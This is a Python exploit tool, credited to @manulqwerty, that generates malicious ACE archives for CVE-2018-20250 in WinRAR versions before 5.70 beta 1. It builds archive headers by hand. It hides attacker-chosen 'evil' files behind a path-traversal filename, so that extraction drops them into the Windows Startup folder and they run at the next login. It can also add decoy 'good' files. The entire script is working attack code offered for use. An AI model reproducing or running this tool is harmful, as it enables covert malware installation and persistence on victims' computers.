#!/usr/bin/env python3
import acefile
import argparse
import binascii
import struct
import os

class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
def get_args():
    parser = argparse.ArgumentParser(description='Evil WinRAR Archive Generator (CVE-2018-20250) - Target: WinRAR < 5.70 beta 1\nBy @manulqwerty - ironhackers.es')
    parser.add_argument('-o', dest='filename', type=str, help='Output filename - Default: evil.rar', default='evil.rar')
    parser.add_argument('-e', metavar='evil_file', nargs='+', dest='evil', type=str, help='Evil files', required=True)
    parser.add_argument('-g', metavar='good_file', nargs='+', dest='good', type=str, help='Good files', required=False)
    parser.add_argument('-p', dest='path', type=str, help='Path to uncompress the evil files - Default: C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe', default='C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\')
    return parser.parse_args()
    
def print_header():
    print(Color.BOLD + Color.GREEN + '''
          _ _  __      ___      ___    _   ___ 
  _____ _(_) | \ \    / (_)_ _ | _ \  /_\ | _ \\
 / -_) V / | |  \ \/\/ /| | ' \|   / / _ \|   /
 \___|\_/|_|_|   \_/\_/ |_|_||_|_|_\/_/ \_\_|_\\'''  + Color.END + Color.RED + 
 '''\n\n                                        by @manulqwerty\n\n''' + Color.BLUE + Color.BOLD + 
 '''----------------------------------------------------------------------\n''' + Color.END)
    
    
def write_shellcode(shellcode, filename):
    with open(filename, 'wb+') as f:
        f.write(binascii.unhexlify(shellcode))
def add_shellcode(shellcode, filename):
    with open(filename, 'ab+') as f:
        f.write(binascii.unhexlify(shellcode))
def read_shellcode(filename):
    with open(filename, 'rb') as f:
        return binascii.hexlify(f.read()).decode('utf-8').upper()
     
def hex2raw(hex_value, N):
    hex_value = hex_value.zfill(N)
    return (''.join([hex_value[x - 1:x + 1] for x in range(len(hex_value) - 1, 0, -2)]).ljust(N, '0'))
    
def build_shellcode(filename, path=''):
    if path == '':
        path = os.path.basename(filename)
    hdr_crc = '6789'
    hdr_size = hex(len(path)+31)[2:]
    hdr_size = hex2raw(hdr_size, 4)
    pack_size = hex(os.path.getsize(filename))[2:]
    pack_size = hex2raw(pack_size, 8)
    origsize = pack_size
    with open(filename, 'rb') as f:
        crc32 = hex(acefile.ace_crc32(f.read()))[2:]
    crc32 = hex2raw(crc32, 8)
    filename_len = hex(len(path))[2:]
    filename_len = hex2raw(filename_len, 4)
    filename = ''.join('{:x}'.format(ord(c)) for c in path)
    shellcode = hdr_crc + hdr_size + '010180' + pack_size \
              + origsize + '63B0554E20000000' + crc32 + '00030A005445' \
              + filename_len + filename + '01020304050607080910A1A2A3A4A5A6A7A8A9'
    return shellcode
    
def str2bytes(str_input):
    return binascii.a2b_hex(str_input.upper())
    
def calculate_crc(shellcode):
    buf = str2bytes(shellcode)[:4]
    hcrc, hsize = struct.unpack('<HH', buf)
    buf = str2bytes(shellcode)[4:hsize + 4]
    new_hcrc = hex2raw(hex(acefile.ace_crc16(buf))[2:].upper(), 4)
    return new_hcrc
    
def build_file(filename, path, dest_filename):
    shellcode = build_shellcode(filename, path)
    add_shellcode(shellcode, dest_filename)
    my_hcrc = calculate_crc(shellcode)
    hcrc_shellcode = shellcode.replace('6789', my_hcrc)
    content = read_shellcode(dest_filename)
    content = content.replace('6789', my_hcrc)
    content = content.replace('01020304050607080910A1A2A3A4A5A6A7A8A9', read_shellcode(filename))
    write_shellcode(content, dest_filename)

if __name__ == '__main__':
    args = get_args()
    print_header()
    header_shellcode = '6B2831000000902A2A4143452A2A141402001018564E974FF6AA00000000162A554E524547495354455245442056455253494F4E2A'
    write_shellcode(header_shellcode, args.filename)
    
    if args.good:
        for i in args.good:
            build_file(i, '', args.filename)
        
    for i in args.evil:
        path = args.path + os.path.basename(i)
        build_file(i, path, args.filename)
    
    with acefile.open(args.filename) as f:
        for member in f:
            if member.is_dir():
                continue
            if f.test(member):
                exit
            else:
                print('CRC FAIL:   %s' % member.filename)
                
    print(Color.YELLOW + '[+] Evil archive generated successfully: ' + args.filename)
    print('[+] Evil path: %s\n' % args.path + Color.END)
